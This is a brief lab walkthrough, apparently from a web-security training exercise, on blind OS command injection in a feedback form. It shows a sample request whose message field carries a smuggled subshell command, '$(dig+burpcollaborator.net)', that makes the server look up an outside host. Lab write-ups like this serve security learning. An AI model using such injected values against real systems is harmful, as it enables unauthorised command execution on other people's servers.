This lab contains a blind OS command injection vulnerability in the feedback function.

If you open Firefox Developer Tools before sending out feedback you can see the request you're sending.

Example request would be something like this:

```
csrf	"wlp18kkrYxOls0OQAVO0YPJhSkw9MOeK"
name	"asd"
email	"asd@asd.asd"
subject	"asd"
message	"asd"
```

We can think a little and deduct that in order to display spaces to message body should be wrapped in quotes and we can inject a command in a subshell like this:

```
csrf	"wlp18kkrYxOls0OQAVO0YPJhSkw9MOeK"
name	"asd"
email	"asd@asd.asd"
subject	"asd"
message	"$(dig+burpcollaborator.net)"
```

DNS lookup will be made and lab will be completed.
